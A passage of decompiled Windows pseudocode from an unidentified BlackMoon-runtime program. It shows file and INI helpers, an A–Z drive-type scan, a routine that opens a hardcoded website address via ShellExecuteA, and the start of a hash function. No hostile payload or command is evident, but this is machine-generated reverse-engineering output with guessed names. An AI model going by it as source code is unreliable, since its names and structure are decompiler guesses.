      v7 = 1;
    }
  }
  if ( !FirstFileA || FirstFileA == (HANDLE)-1 )
    return 0;
  if ( !v7 )
  {
    if ( a3 )
    {
      if ( FindNextFileA(FirstFileA, &FindFileData) )
      {
        while ( (FindFileData.dwFileAttributes & 0x10) == 16 )
        {
          if ( !FindNextFileA(FirstFileA, &FindFileData) )
            return 0;
        }
        goto LABEL_24;
      }
    }
    else if ( FindNextFileA(FirstFileA, &FindFileData) )
    {
      while ( (a2 & FindFileData.dwFileAttributes) == 0 )
      {
        result = FindNextFileA(FirstFileA, &FindFileData);
        if ( !result )
          return result;
      }
      goto LABEL_24;
    }
    return 0;
  }
LABEL_24:
  v6 = (char *)sub_4024B0(strlen(FindFileData.cFileName) + 1);
  strcpy(v6, FindFileData.cFileName);
  return (BOOL)v6;
}

//----- (00402D10) --------------------------------------------------------
HANDLE __cdecl sub_402D10(HANDLE hFindFile)
{
  HANDLE result; // eax

  result = hFindFile;
  if ( hFindFile )
  {
    if ( hFindFile != (HANDLE)-1 )
      return (HANDLE)FindClose(hFindFile);
  }
  return result;
}

//----- (00402D30) --------------------------------------------------------
CHAR *__cdecl sub_402D30(int a1, LPCSTR lpName)
{
  CHAR *v2; // edi
  DWORD EnvironmentVariableA; // esi
  DWORD v4; // ebx

  v2 = (CHAR *)sub_4024B0(0x104u);
  EnvironmentVariableA = GetEnvironmentVariableA(lpName, v2, 0x104u);
  if ( EnvironmentVariableA <= 0x104 )
    return v2;
  do
  {
    sub_402540(v2);
    v4 = EnvironmentVariableA;
    v2 = (CHAR *)sub_4024B0(EnvironmentVariableA);
    EnvironmentVariableA = GetEnvironmentVariableA(lpName, v2, EnvironmentVariableA);
  }
  while ( EnvironmentVariableA > v4 );
  return v2;
}

//----- (00402D90) --------------------------------------------------------
void *__cdecl sub_402D90(
        int a1,
        LPCSTR lpFileName,
        int a3,
        int a4,
        LPCSTR lpAppName,
        int a6,
        int a7,
        LPCSTR lpKeyName,
        int a9,
        int a10,
        LPCSTR lpDefault)
{
  CHAR *v11; // esi
  signed int PrivateProfileStringA; // eax
  size_t v13; // edi
  void *v14; // ebx
  unsigned int v15; // kr04_4

  v11 = (CHAR *)sub_41665F(0x400u);
  PrivateProfileStringA = GetPrivateProfileStringA(lpAppName, lpKeyName, lpDefault, v11, 0x400u, lpFileName);
  if ( PrivateProfileStringA >= 1023 )
  {
    do
    {
      v13 = PrivateProfileStringA + 1024;
      sub_416688(v11);
      v11 = (CHAR *)sub_41665F(v13);
      PrivateProfileStringA = GetPrivateProfileStringA(lpAppName, lpKeyName, lpDefault, v11, v13, lpFileName);
    }
    while ( PrivateProfileStringA >= (int)(v13 - 1) );
  }
  v14 = 0;
  v15 = strlen(v11) + 1;
  if ( v15 != 1 )
    v14 = sub_4036F0(v11, v15 - 1);
  sub_416688(v11);
  return v14;
}

//----- (00402E30) --------------------------------------------------------
_DWORD *__cdecl sub_402E30(int a1, LPCSTR lpFileName, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10)
{
  DWORD v10; // ecx
  DWORD v11; // edx
  DWORD v12; // eax
  HANDLE FileA; // edi
  _DWORD *v14; // esi

  if ( a7 )
  {
    switch ( a5 )
    {
      case 1:
        v10 = 0x80000000;
        goto LABEL_9;
      case 2:
        v10 = 0x40000000;
        goto LABEL_9;
      case 4:
        v10 = 0x40000000;
        v11 = 2;
        break;
      case 5:
        v10 = 0x40000000;
        v11 = 4;
        break;
      case 6:
        v10 = -1073741824;
        v11 = 4;
        break;
      default:
        goto LABEL_8;
    }
  }
  else
  {
LABEL_8:
    v10 = -1073741824;
LABEL_9:
    v11 = 3;
  }
  if ( a10 )
  {
    v12 = a8;
    if ( a8 != 2 )
    {
      if ( a8 == 3 )
        v12 = 1;
      else
        v12 = a8 != 4 ? 3 : 0;
    }
  }
  else
  {
    v12 = 3;
  }
  FileA = CreateFileA(lpFileName, v10, v12, 0, v11, 0x20u, 0);
  if ( FileA == (HANDLE)-1 )
    return 0;
  v14 = sub_41665F(0xCu);
  *v14 = 1;
  v14[1] = FileA;
  sub_403820(v14);
  return v14;
}

//----- (00402F10) --------------------------------------------------------
int __cdecl sub_402F10(int a1, _DWORD *a2, int a3, int a4, char a5)
{
  int result; // eax
  int v6; // ebx
  void *v7; // edi
  char *i; // esi
  int v9; // esi
  char *v10; // edi
  int v11; // ebx
  int v12; // [esp+8h] [ebp-8h]
  DWORD NumberOfBytesWritten; // [esp+Ch] [ebp-4h] BYREF

  if ( !a2 )
    return 0;
  result = sub_403850(a2);
  if ( result )
  {
    v6 = 1;
    v12 = 0;
    if ( *a2 == 1 )
    {
      v7 = (void *)a2[1];
      v12 = 1;
      if ( a1 > 1 )
      {
        for ( i = &a5;
              WriteFile(v7, (LPCVOID)(*(_DWORD *)i + 8), *(_DWORD *)(*(_DWORD *)i + 4), &NumberOfBytesWritten, 0);
              i += 12 )
        {
          if ( ++v6 >= a1 )
            return 1;
        }
        return 0;
      }
    }
    else if ( *a2 == 2 )
    {
      v9 = a2[1];
      v12 = 1;
      if ( a1 > 1 )
      {
        v10 = &a5;
        v11 = a1 - 1;
        do
        {
          (*(void (__thiscall **)(int, int, _DWORD))(*(_DWORD *)v9 + 36))(
            v9,
            *(_DWORD *)v10 + 8,
            *(_DWORD *)(*(_DWORD *)v10 + 4));
          v10 += 12;
          --v11;
        }
        while ( v11 );
      }
    }
    return v12;
  }
  return result;
}

//----- (00402FF0) --------------------------------------------------------
BOOL __cdecl sub_402FF0(
        int a1,
        LPCSTR lpFileName,
        int a3,
        int a4,
        LPCSTR lpAppName,
        int a6,
        int a7,
        LPCSTR lpKeyName,
        int a9,
        int a10,
        LPCSTR lpString)
{
  return WritePrivateProfileStringA(lpAppName, lpKeyName, lpString, lpFileName);
}

//----- (00403010) --------------------------------------------------------
void __cdecl sub_403010(int a1, HANDLE *a2)
{
  if ( a2 )
    sub_4037A0(a2);
}

//----- (00403020) --------------------------------------------------------
int __cdecl sub_403020(
        int a1,
        const char *a2,
        int a3,
        int a4,
        char *Str2,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11)
{
  unsigned int v11; // kr04_4
  signed int v12; // edx
  unsigned int v13; // kr08_4
  signed int v14; // ecx
  size_t v15; // edi
  int v16; // eax
  int v17; // edx
  const char *v18; // esi
  const char *v19; // ebx

  v11 = strlen(a2) + 1;
  v12 = v11 - 1;
  v13 = strlen(Str2) + 1;
  v14 = v13 - 1;
  v15 = v13 - 1;
  if ( v11 == 1 || v13 == 1 || v14 > v12 )
    return -1;
  if ( !a10 || (v16 = a8, a8 <= 0) )
    v16 = 1;
  v17 = v12 - v14;
  if ( v16 > v17 + 1 )
    return -1;
  v18 = &a2[v16 - 1];
  v19 = &a2[v17];
  if ( !a11 )
  {
    if ( v18 <= v19 )
    {
      while ( strncmp(v18, Str2, v15) )
      {
        if ( *v18 >= 0 )
          ++v18;
        else
          v18 += 2;
        if ( v18 > v19 )
          return -1;
      }
      return v18 - a2 + 1;
    }
    return -1;
  }
  if ( v18 > v19 )
    return -1;
  while ( _strnicmp(v18, Str2, v15) )
  {
    if ( *v18 >= 0 )
      ++v18;
    else
      v18 += 2;
    if ( v18 > v19 )
      return -1;
  }
  return v18 - a2 + 1;
}

//----- (004030F0) --------------------------------------------------------
int __stdcall sub_4030F0(int a1, _DWORD *lpMem, int *dwBytes)
{
  __int64 v3; // rax
  char *v4; // eax
  LPSTR CommandLineA; // eax
  CHAR v6; // dl
  _BYTE *v7; // eax
  char v8; // cl
  struct tagMSG Msg; // [esp+10h] [ebp-51Ch] BYREF
  CHAR v11[256]; // [esp+2Ch] [ebp-500h] BYREF
  CHAR Text[1024]; // [esp+12Ch] [ebp-400h] BYREF

  if ( a1 > 2023 )
  {
    switch ( a1 )
    {
      case 2024:
        LODWORD(v3) = sub_4024B0((SIZE_T)lpMem);
        break;
      case 2025:
        sub_402540(lpMem);
        LODWORD(v3) = 0;
        break;
      case 2026:
        LODWORD(v3) = sub_402500(lpMem, (SIZE_T)dwBytes);
        break;
      case 2027:
        wsprintfA(Text, "BlackMoon RunTime Error:\r\n\r\n%s", (const char *)lpMem);
        MessageBoxA(0, Text, aError_0, 0x10u);
        sub_402420();
        LODWORD(v3) = 0;
        break;
      case 2028:
        sub_402420();
        LODWORD(v3) = 0;
        break;
      case 2030:
        LODWORD(v3) = 3;
        break;
      case 2032:
      case 2033:
        goto LABEL_67;
      default:
        goto LABEL_66;
    }
  }
  else
  {
    if ( a1 == 2023 )
    {
      if ( (unsigned int)lpMem > 0x80000201 )
      {
        if ( (unsigned int)lpMem > 0x80000501 )
        {
          if ( lpMem != (_DWORD *)-2147482111 )
            goto LABEL_67;
        }
        else if ( lpMem != (_DWORD *)-2147482367 && lpMem != (_DWORD *)-2147482879 && lpMem != (_DWORD *)-2147482623 )
        {
          LODWORD(v3) = 0;
          return v3;
        }
      }
      else if ( lpMem != (_DWORD *)-2147483135 )
      {
        if ( (unsigned int)lpMem > 0x80000006 )
        {
          if ( lpMem != (_DWORD *)-2147483391 )
          {
            LODWORD(v3) = 0;
            return v3;
          }
        }
        else if ( lpMem != (_DWORD *)-2147483642 )
        {
          switch ( (unsigned int)lpMem )
          {
            case 0x80000002:
            case 0x80000003:
              goto LABEL_58;
            case 0x80000004:
            case 0x80000005:
              sub_403880(dwBytes);
              LODWORD(v3) = 0;
              break;
            default:
              goto LABEL_67;
          }
          return v3;
        }
      }
LABEL_58:
      sub_402540(dwBytes);
      LODWORD(v3) = 0;
      return v3;
    }
    if ( a1 > 2002 )
    {
      switch ( a1 )
      {
        case 2003:
          if ( GetModuleFileNameA(0, Str, 0x104u) )
          {
            *strrchr(Str, 92) = 0;
            LODWORD(v3) = Str;
            return v3;
          }
          break;
        case 2004:
          if ( GetModuleFileNameA(0, Str, 0x104u) )
          {
            LODWORD(v3) = strrchr(Str, 92) + 1;
            *(_BYTE *)v3 = 0;
            LODWORD(v3) = v3 + 1;
            return v3;
          }
          break;
        case 2018:
          if ( PeekMessageA(&Msg, 0, 0, 0, 0) )
          {
            while ( Msg.message != 18 )
            {
              GetMessageA(&Msg, 0, 0, 0);
              TranslateMessage(&Msg);
              DispatchMessageA(&Msg);
              LODWORD(v3) = PeekMessageA(&Msg, 0, 0, 0, 0);
              if ( !(_DWORD)v3 )
                return v3;
            }
          }
          goto LABEL_67;
        default:
          goto LABEL_66;
      }
      goto LABEL_67;
    }
    if ( a1 == 2002 )
    {
      CommandLineA = GetCommandLineA();
      v6 = *CommandLineA;
      v7 = CommandLineA + 1;
      v8 = 32;
      if ( v6 == 34 )
        v8 = 34;
      BYTE4(v3) = *v7;
      for ( LODWORD(v3) = v7 + 1; BYTE4(v3) != v8; LODWORD(v3) = v3 + 1 )
        BYTE4(v3) = *(_BYTE *)v3;
      if ( v8 != 32 && *(_BYTE *)v3 == 32 )
        LODWORD(v3) = v3 + 1;
    }
    else
    {
      if ( a1 <= 1006 )
      {
        if ( a1 != 1006 )
        {
          if ( a1 == 1004 )
          {
            LODWORD(v3) = 1;
            return v3;
          }
          if ( a1 == 1005 )
          {
            LODWORD(v3) = 4;
            return v3;
          }
          goto LABEL_66;
        }
        if ( GetModuleFileNameA(0, Str, 0x104u) )
        {
          v4 = strrchr(Str, 92) + 1;
          *v4 = 0;
          strcpy(&byte_429CE4, v4 + 1);
        }
        else
        {
          Str[0] = 0;
          byte_429CE4 = 0;
        }
        if ( lpMem == (_DWORD *)1 )
        {
          LODWORD(v3) = Str;
          strcpy((char *)dwBytes, Str);
          return v3;
        }
        if ( lpMem == (_DWORD *)2001 )
        {
          strcpy((char *)dwBytes, Str);
          LODWORD(v3) = Str;
          return v3;
        }
        if ( lpMem == (_DWORD *)2002 )
        {
          LODWORD(v3) = &byte_429CE4;
          strcpy((char *)dwBytes, &byte_429CE4);
          return v3;
        }
LABEL_67:
        LODWORD(v3) = 0;
        return v3;
      }
      if ( a1 != 2001 )
      {
LABEL_66:
        wsprintfA(v11, "%d. ", a1);
        MessageBoxA(0, v11, aBlackmoon, 0x10u);
        goto LABEL_67;
      }
      HIDWORD(v3) = lpMem[2];
      LODWORD(v3) = *lpMem;
      if ( HIDWORD(v3) != -2147482623 )
      {
        if ( HIDWORD(v3) == -2147482367 )
        {
          return (__int64)*(float *)lpMem;
        }
        else if ( HIDWORD(v3) == -2147482111 )
        {
          return (__int64)*(double *)lpMem;
        }
      }
    }
  }
  return v3;
}
// 429CE4: using guessed type char byte_429CE4;

//----- (00403650) --------------------------------------------------------
_DWORD *__cdecl sub_403650(const void *a1, unsigned int a2)
{
  _DWORD *result; // eax

  if ( !a2 )
    return 0;
  result = sub_4024B0(a2 + 8);
  result[1] = a2;
  *result = 1;
  qmemcpy(result + 2, a1, a2);
  return result;
}

//----- (00403690) --------------------------------------------------------
int __cdecl sub_403690(int a1)
{
  int result; // eax

  result = a1;
  if ( a1 )
  {
    if ( (a1 & 0xC0000000) == 0x80000000 )
      return 1;
    else
      return ((a1 & 0xC0000000) != 0x40000000) + 2;
  }
  return result;
}

//----- (004036C0) --------------------------------------------------------
int *__cdecl sub_4036C0(int *a1, int *a2)
{
  int v2; // ecx
  int v3; // edx
  int *result; // eax
  int v5; // esi

  v2 = 1;
  v3 = *a1;
  result = a1 + 1;
  if ( *a1 <= 0 )
  {
    *a2 = 1;
  }
  else
  {
    do
    {
      v5 = *result++;
      v2 *= v5;
      --v3;
    }
    while ( v3 );
    *a2 = v2;
  }
  return result;
}

//----- (004036F0) --------------------------------------------------------
void *__cdecl sub_4036F0(const void *a1, signed int a2)
{
  void *result; // eax

  if ( a2 <= 0 )
    return 0;
  result = sub_4024B0(a2 + 1);
  qmemcpy(result, a1, a2);
  *((_BYTE *)result + a2) = 0;
  return result;
}

//----- (00403730) --------------------------------------------------------
void sub_403730()
{
  LPVOID v0; // esi
  bool v1; // zf
  int v2; // ecx
  _DWORD *v3; // eax

  v0 = dword_429EEC;
  v1 = dword_429EEC == 0;
  dword_429EEC = 0;
  dword_429CD4 = 0;
  if ( !v1 )
  {
    do
    {
      v2 = *((_DWORD *)v0 + 1);
      if ( v2 )
      {
        if ( *(_DWORD *)v0 == 1 )
        {
          CloseHandle(*((HANDLE *)v0 + 1));
        }
        else if ( *(_DWORD *)v0 == 2 )
        {
          (*(void (__thiscall **)(int, int))(*(_DWORD *)v2 + 16))(v2, 1);
        }
      }
      v3 = v0;
      v0 = (LPVOID)*((_DWORD *)v0 + 2);
      *v3 = 0;
      v3[1] = 0;
      v3[2] = 0;
      sub_416688(v3);
    }
    while ( v0 );
  }
}
// 403770: conditional instruction was optimized away because ecx.4!=0
// 429CD4: using guessed type int (*dword_429CD4)(void);

//----- (004037A0) --------------------------------------------------------
void __cdecl sub_4037A0(HANDLE *a1)
{
  HANDLE *v1; // esi
  HANDLE *v2; // eax
  HANDLE v3; // ecx

  v1 = (HANDLE *)dword_429EEC;
  v2 = 0;
  if ( dword_429EEC )
  {
    while ( v1 != a1 )
    {
      v2 = v1;
      v1 = (HANDLE *)v1[2];
      if ( !v1 )
        return;
    }
    if ( v2 )
    {
      v2[2] = v1[2];
    }
    else
    {
      dword_429EEC = v1[2];
      if ( !dword_429EEC )
        dword_429CD4 = 0;
    }
    v3 = v1[1];
    if ( v3 )
    {
      if ( *v1 == HANDLE_FLAG_INHERIT )
      {
        CloseHandle(v1[1]);
      }
      else if ( *v1 == HANDLE_FLAG_PROTECT_FROM_CLOSE )
      {
        (*(void (__thiscall **)(HANDLE, int))(*(_DWORD *)v3 + 16))(v3, 1);
      }
    }
    *v1 = 0;
    v1[1] = 0;
    v1[2] = 0;
    sub_416688(v1);
  }
}
// 4037FB: conditional instruction was optimized away because ecx.4!=0
// 429CD4: using guessed type int (*dword_429CD4)(void);

//----- (00403820) --------------------------------------------------------
LPVOID __cdecl sub_403820(_DWORD *a1)
{
  LPVOID result; // eax

  result = dword_429EEC;
  if ( !dword_429EEC )
    dword_429CD4 = (int (*)(void))sub_403730;
  a1[2] = dword_429EEC;
  dword_429EEC = a1;
  return result;
}
// 429CD4: using guessed type int (*dword_429CD4)(void);

//----- (00403850) --------------------------------------------------------
int __cdecl sub_403850(_DWORD *a1)
{
  _DWORD *v1; // eax

  v1 = dword_429EEC;
  if ( !dword_429EEC )
    return 0;
  while ( v1 != a1 )
  {
    v1 = (_DWORD *)v1[2];
    if ( !v1 )
      return 0;
  }
  return 1;
}

//----- (00403880) --------------------------------------------------------
void __cdecl sub_403880(int *lp)
{
  int *v1; // esi
  unsigned int i; // edi
  unsigned int v3; // [esp+Ch] [ebp-4h] BYREF

  v3 = 0;
  v1 = sub_4036C0(lp, (int *)&v3);
  for ( i = 0; i < v3; ++i )
  {
    if ( *v1 )
    {
      sub_402540((void *)*v1);
      *v1 = 0;
    }
    ++v1;
  }
  sub_402540(lp);
}

//----- (004038E0) --------------------------------------------------------
int sub_4038E0()
{
  unknown_libname_3();
  return atexit(unknown_libname_4);
}
// 4038F0: using guessed type int unknown_libname_3(void);

//----- (00403920) --------------------------------------------------------
int __stdcall sub_403920(int a1, int a2, int a3)
{
  int result; // eax

  if ( dword_429F10 )
  {
    result = dword_429F10(a1, a2, a3);
    dword_429EF0 = result;
  }
  else
  {
    dword_429EF0 = 0;
    return 0;
  }
  return result;
}
// 429EF0: using guessed type int dword_429EF0;
// 429F10: using guessed type int (__stdcall *dword_429F10)(_DWORD, _DWORD, _DWORD);

//----- (00403960) --------------------------------------------------------
int __stdcall sub_403960(int a1, int (__stdcall *a2)(_DWORD, _DWORD, _DWORD), int a3)
{
  int result; // eax

  result = 0;
  if ( a1 != 1 )
    return -1;
  dword_429F10 = a2;
  return result;
}
// 429F10: using guessed type int (__stdcall *dword_429F10)(_DWORD, _DWORD, _DWORD);

//----- (00403980) --------------------------------------------------------
int __cdecl sub_403980(int a1)
{
  return sub_403920(2024, a1, 0);
}

//----- (004039A0) --------------------------------------------------------
void __cdecl sub_4039A0(_DWORD *a1, int a2, int *a3)
{
  int v3; // esi
  char **v4; // eax
  const char **v5; // ebx
  int v6; // eax
  int v7; // ebp
  _DWORD *v8; // eax
  int *v9; // eax
  int *v10; // esi
  int v11; // esi
  char *v12; // edx
  _DWORD *v13; // eax
  int *v14; // ecx
  _DWORD *v15; // edx
  int v16; // edi
  int i; // [esp+Ch] [ebp-24h]
  char **v18; // [esp+10h] [ebp-20h]
  int *v19; // [esp+14h] [ebp-1Ch]
  _DWORD v20[6]; // [esp+18h] [ebp-18h] BYREF
  int v21; // [esp+3Ch] [ebp+Ch]

  sub_403C10(v20);
  if ( !a3[2] || (v3 = *a3, *a3 < 0) || v3 > 4 )
    v3 = 0;
  v4 = (char **)malloc(0x68u);
  v5 = (const char **)v4;
  v18 = v4;
  switch ( v3 )
  {
    case 1:
      v6 = sub_403C60(3, v4);
      break;
    case 2:
      v6 = sub_403C60(5, v4);
      break;
    case 3:
      v6 = sub_403C60(2, v4);
      break;
    case 4:
      v6 = sub_403C60(4, v4);
      break;
    default:
      v6 = sub_403C60(0, v4);
      break;
  }
  v7 = v6;
  if ( v6 )
  {
    v9 = (int *)malloc(4 * v6);
    v10 = v9;
    v19 = v9;
    if ( v7 > 0 )
    {
      v11 = (char *)v9 - (char *)v5;
      v21 = v7;
      for ( i = (char *)v9 - (char *)v5; ; v11 = i )
      {
        v12 = (char *)sub_403980(3);
        *(const char **)((char *)v5 + v11) = v12;
        strcpy(v12, *v5);
        sub_40AD16((LPVOID)*v5++);
        if ( !--v21 )
          break;
      }
      v5 = (const char **)v18;
      v10 = v19;
    }
    v13 = (_DWORD *)sub_403980(4 * v7 + 8);
    *v13 = 1;
    v13[1] = v7;
    if ( v7 > 0 )
    {
      v14 = v10;
      v15 = v13 + 2;
      do
      {
        v16 = *v14++;
        *v15++ = v16;
        --v7;
      }
      while ( v7 );
    }
    *a1 = v13;
    sub_40AD16(v10);
    sub_40AD16(v5);
    sub_403C50(v20);
  }
  else
  {
    sub_40AD16(v5);
    v8 = (_DWORD *)sub_403980(8);
    *v8 = 1;
    v8[1] = 0;
    *a1 = v8;
    sub_403C50(v20);
  }
}
// 4039A0: using guessed type _DWORD var_18[6];

//----- (00403B20) --------------------------------------------------------
void __cdecl sub_403B20(int a1, int a2, int a3)
{
  const CHAR *v3; // eax
  LPCSTR lpFile; // [esp+0h] [ebp-10h] BYREF
  _DWORD v5[3]; // [esp+4h] [ebp-Ch] BYREF

  sub_403D70(v5);
  if ( *(_DWORD *)(a3 + 8) )
    v3 = *(const CHAR **)a3;
  else
    v3 = aWwwDywtComCn;
  sub_41698C((CString *)&lpFile, v3);
  sub_403DB0(lpFile);
  sub_41691E(&lpFile);
  sub_403DA0(v5);
}
// 403B20: using guessed type _DWORD var_C[3];

//----- (00403B70) --------------------------------------------------------
unsigned int *__thiscall sub_403B70(unsigned int *lpMem, char a2)
{
  sub_403B90(lpMem);
  if ( (a2 & 1) != 0 )
    sub_416688(lpMem);
  return lpMem;
}

//----- (00403B90) --------------------------------------------------------
BOOL __thiscall sub_403B90(unsigned int *this)
{
  *this = (unsigned int)&off_41E4E0;
  return sub_41A013(this);
}
// 41E4E0: using guessed type int (*off_41E4E0)();

//----- (00403BD0) --------------------------------------------------------
int sub_403BD0()
{
  unknown_libname_5();
  return atexit(unknown_libname_6);
}
// 403BE0: using guessed type int unknown_libname_5(void);

//----- (00403C10) --------------------------------------------------------
_DWORD *__thiscall sub_403C10(_DWORD *this)
{
  _DWORD *result; // eax

  result = this;
  this[4] = 0;
  this[2] = 0;
  *this = &off_41E4EC;
  this[5] = 0;
  this[3] = 0;
  return result;
}
// 41E4EC: using guessed type void *off_41E4EC;

//----- (00403C50) --------------------------------------------------------
void __thiscall sub_403C50(_DWORD *this)
{
  *this = &off_41E4EC;
}
// 41E4EC: using guessed type void *off_41E4EC;

//----- (00403C60) --------------------------------------------------------
int __stdcall sub_403C60(int a1, char **a2)
{
  int v2; // ebp
  char *v4; // eax
  const char *v5; // edi
  bool v6; // zf
  LPCSTR lpRootPathName; // [esp+10h] [ebp-14h] BYREF
  int v9; // [esp+14h] [ebp-10h]
  int v10; // [esp+20h] [ebp-4h]
  int v11; // [esp+2Ch] [ebp+8h]

  v2 = 0;
  lpRootPathName = (LPCSTR)off_42667C;
  v10 = 0;
  v9 = 65;
  v11 = 26;
  do
  {
    sub_4152E0((CString *)&lpRootPathName, aC, v9);
    if ( a1 )
    {
      if ( GetDriveTypeA(lpRootPathName) == a1 )
      {
LABEL_5:
        v4 = (char *)malloc(3u);
        v5 = lpRootPathName;
        *a2 = v4;
        strcpy(v4, v5);
        ++v2;
        ++a2;
      }
    }
    else
    {
      switch ( GetDriveTypeA(lpRootPathName) )
      {
        case 2u:
        case 3u:
        case 4u:
        case 5u:
          goto LABEL_5;
        default:
          break;
      }
    }
    v6 = v11 == 1;
    ++v9;
    --v11;
  }
  while ( !v6 );
  v10 = -1;
  sub_41691E(&lpRootPathName);
  return v2;
}
// 42667C: using guessed type void *off_42667C;

//----- (00403D70) --------------------------------------------------------
_DWORD *__thiscall sub_403D70(_DWORD *this)
{
  _DWORD *result; // eax

  result = this;
  *this = &off_41E4F0;
  return result;
}
// 41E4F0: using guessed type void *off_41E4F0;

//----- (00403DA0) --------------------------------------------------------
void __thiscall sub_403DA0(_DWORD *this)
{
  *this = &off_41E4F0;
}
// 41E4F0: using guessed type void *off_41E4F0;

//----- (00403DB0) --------------------------------------------------------
HINSTANCE __stdcall sub_403DB0(LPCSTR lpFile)
{
  HWND Window; // eax

  Window = FindWindowExA(0, 0, 0, szWindow);
  return ShellExecuteA(Window, Operation, lpFile, 0, 0, 1);
}

//----- (00403E10) --------------------------------------------------------
int __thiscall sub_403E10(int this)
{
  int result; // eax

  sub_403E30((_DWORD *)this, *(LPVOID *)(this + 8));
  result = 0;
  *(_DWORD *)(this + 8) = 0;
  *(_DWORD *)(this + 16) = 0;
  *(_DWORD *)(this + 12) = 0;
  return result;
}

//----- (00403E30) --------------------------------------------------------
void __thiscall sub_403E30(_DWORD *this, LPVOID lpMem)
{
  int v2; // esi
  HANDLE ProcessHeap; // eax

  if ( lpMem )
  {
    v2 = this[1];
    if ( (unsigned int)lpMem < v2 + 100 || (unsigned int)lpMem >= v2 + 49252 )
    {
      ProcessHeap = dword_4363AC;
      if ( !dword_4363AC )
      {
        ProcessHeap = GetProcessHeap();
        dword_4363AC = ProcessHeap;
      }
      HeapFree(ProcessHeap, 0, lpMem);
    }
    else
    {
      *(_BYTE *)(((int)lpMem - v2 - 100) / 512 + v2 + 4) = 0;
      --*(_DWORD *)this[1];
    }
  }
}

//----- (00403EA0) --------------------------------------------------------
int sub_403EA0()
{
  if ( (byte_444CC9 & 1) == 0 )
    byte_444CC9 |= 1u;
  sub_403EF0();
  if ( (byte_444CCA & 1) == 0 )
    byte_444CCA |= 1u;
  sub_403F00();
  if ( (byte_444CCB & 1) == 0 )
    byte_444CCB |= 1u;
  return sub_403F10();
}
// 444CC9: using guessed type char byte_444CC9;
// 444CCA: using guessed type char byte_444CCA;
// 444CCB: using guessed type char byte_444CCB;

//----- (00403EF0) --------------------------------------------------------
int sub_403EF0()
{
  return atexit(nullsub_5);
}

//----- (00403F00) --------------------------------------------------------
int sub_403F00()
{
  return atexit(nullsub_5);
}

//----- (00403F10) --------------------------------------------------------
int sub_403F10()
{
  return atexit(nullsub_5);
}

//----- (00403F60) --------------------------------------------------------
int sub_403F60()
{
  if ( (byte_444CC5 & 1) == 0 )
    byte_444CC5 |= 1u;
  sub_403FB0();
  if ( (byte_444CC6 & 1) == 0 )
    byte_444CC6 |= 1u;
  sub_403FC0();
  if ( (byte_444CC7 & 1) == 0 )
    byte_444CC7 |= 1u;
  return sub_403FD0();
}
// 444CC5: using guessed type char byte_444CC5;
// 444CC6: using guessed type char byte_444CC6;
// 444CC7: using guessed type char byte_444CC7;

//----- (00403FB0) --------------------------------------------------------
int sub_403FB0()
{
  return atexit(nullsub_5);
}

//----- (00403FC0) --------------------------------------------------------
int sub_403FC0()
{
  return atexit(nullsub_5);
}

//----- (00403FD0) --------------------------------------------------------
int sub_403FD0()
{
  return atexit(nullsub_5);
}

//----- (00403FE0) --------------------------------------------------------
char *__cdecl sub_403FE0(const char *a1)
{
  int v1; // kr04_4
  char *result; // eax

  if ( !a1 || !*a1 )
    return 0;
  v1 = strlen(a1) + 1;
  result = (char *)sub_404080(2024, v1, 0);
  qmemcpy(result, a1, v1 - 1);
  result[v1 - 1] = 0;
  return result;
}

//----- (00404030) --------------------------------------------------------
char *__cdecl sub_404030(char **a1, int a2, int a3)
{
  char *result; // eax
  char v4[36]; // [esp+0h] [ebp-24h] BYREF

  sub_4040E0((char *)(*(_DWORD *)a3 + 8), *(_DWORD *)(*(_DWORD *)a3 + 4), v4);
  result = sub_403FE0(v4);
  *a1 = result;
  return result;
}

//----- (00404060) --------------------------------------------------------
int __stdcall sub_404060(int a1, int a2, int a3)
{
  int result; // eax

  result = 0;
  if ( a1 != 1 )
    return -1;
  dword_4363B8 = a2;
  return result;
}
// 4363B8: using guessed type int dword_4363B8;

//----- (00404080) --------------------------------------------------------
int __stdcall sub_404080(int a1, int a2, int a3)
{
  int result; // eax

  if ( dword_4363B8 )
  {
    result = dword_4363B8(a1, a2, a3);
    dword_4363B4 = result;
  }
  else
  {
    dword_4363B4 = 0;
    return 0;
  }
  return result;
}
// 4363B8: invalid function type '?' has been ignored
// 4363B4: using guessed type int dword_4363B4;
// 4363B8: using guessed type int (__stdcall *dword_4363B8)(_DWORD, _DWORD, _DWORD);

//----- (004040C0) --------------------------------------------------------
int __stdcall sub_4040C0(int a1, int a2, int a3)
{
  return sub_404060(a1, a2, a3);
}

//----- (004040E0) --------------------------------------------------------
int __cdecl sub_4040E0(char *a1, unsigned int a2, char *a3)
{
  _DWORD v4[26]; // [esp+0h] [ebp-68h] BYREF

  sub_404BE0(v4);
  v4[25] = 0;
  sub_404D60(v4, a1, a2);
  return sub_404C70((int)v4, a3);
}

//----- (00404140) --------------------------------------------------------
void __stdcall sub_404140(int a1, int a2, unsigned int a3)
{
  unsigned __int16 *v4; // eax
  unsigned __int16 v5; // cx
  int v6; // edx

  if ( a3 )
  {
    v4 = (unsigned __int16 *)(a2 + 2);
    do
    {
      v5 = *v4;
      v6 = *((unsigned __int8 *)v4 - 1);
      v4 += 2;
      a1 += 4;
      *(_DWORD *)(a1 - 4) = *((unsigned __int8 *)v4 - 6) | ((v6 | (v5 << 8)) << 8);
    }
    while ( (unsigned int)v4 - 2 - a2 < a3 );
  }
}

//----- (00404190) --------------------------------------------------------
int __thiscall sub_404190(_DWORD *this, int a2)
{
  int v3; // edx
  int v4; // eax
  unsigned __int64 v5; // kr00_8
  int v6; // eax
  unsigned __int64 v7; // kr08_8
  int v8; // ecx
  unsigned __int64 v9; // kr10_8
  int v10; // edx
  unsigned int v11; // eax
  int v12; // edi
  unsigned int v13; // ecx
  int v14; // eax
  unsigned int v15; // edx
  int v16; // ecx
  unsigned int v17; // edi
  int v18; // edx
  unsigned int v19; // eax
  int v20; // edi
  unsigned int v21; // ecx
  int v22; // eax
  unsigned int v23; // edx
  int v24; // ecx
  unsigned int v25; // edi
  int v26; // edx
  unsigned int v27; // eax
  int v28; // edi
  int v29; // eax
  unsigned int v30; // ecx
  int v31; // ebx
  unsigned int v32; // edx
  int v33; // ecx
  unsigned int v34; // edi
  int v35; // edx
  unsigned int v36; // eax
  int v37; // edi
  unsigned int v38; // ebx
  int v39; // eax
  int v40; // ebx
  int v41; // eax
  int v42; // ecx
  int v43; // ecx
  unsigned int v44; // edi
  int v45; // edx
  unsigned int v46; // ebx
  int v47; // edi
  unsigned int v48; // ecx
  int v49; // eax
  unsigned int v50; // edx
  int v51; // ecx
  __int64 v52; // kr18_8
